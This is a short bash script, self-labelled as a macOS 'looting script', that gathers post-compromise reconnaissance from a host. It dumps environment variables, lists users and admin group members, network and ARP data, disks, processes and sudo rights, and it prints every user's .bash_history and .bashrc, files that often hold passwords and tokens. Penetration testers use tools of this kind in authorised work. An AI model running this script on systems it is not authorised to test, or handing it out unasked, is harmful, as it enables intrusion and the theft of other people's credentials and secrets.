#! /bin/bash

#
#       forgetmenot_osx.sh
#       standalone osx looting script
#
#       Eric Valenzuela, eevn.io
#       05/02/2018
#

echo 'This script does not save on its own. To save, pipe the output to a file.'

uname -a
printenv

dscl . list /Users | grep -v _
dscl . read /Groups/admin GroupMembership
w
last

ifconfig
arp -a

df
diskutil list
diskutil info -all

top -l 1
ps -ef
sudo -l

for d in /Users/*/; do
    echo "$d"
    cat "$d.bash_history"
    cat "$d.bashrc"
done

